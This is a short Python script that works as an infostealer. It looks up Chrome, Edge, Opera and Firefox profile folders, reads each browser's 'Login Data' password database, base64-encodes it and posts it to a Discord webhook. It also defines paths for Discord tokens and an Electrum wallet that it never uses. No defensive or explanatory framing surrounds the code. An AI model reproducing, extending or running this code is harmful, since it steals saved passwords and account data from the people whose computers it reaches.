
import os, json, base64, requests
browsers = [
    "~\\AppData\\Local\\Google\\Chrome\\User Data",
    "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
    "~\\AppData\\Local\\Microsoft\\Edge\\User Data",
    "~\\AppData\\Roaming\\Opera Software\\Opera Stable",
]
discord_path = "~\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
wallet = "~\\AppData\\Roaming\\Electrum\\wallets"
for b in browsers:
    path = os.path.expanduser(b)
    if os.path.exists(path):
        data = open(os.path.join(path, "Default", "Login Data"), "rb").read()
        requests.post("https://discord.com/api/webhooks/123/abc", json={"content": base64.b64encode(data).decode()})
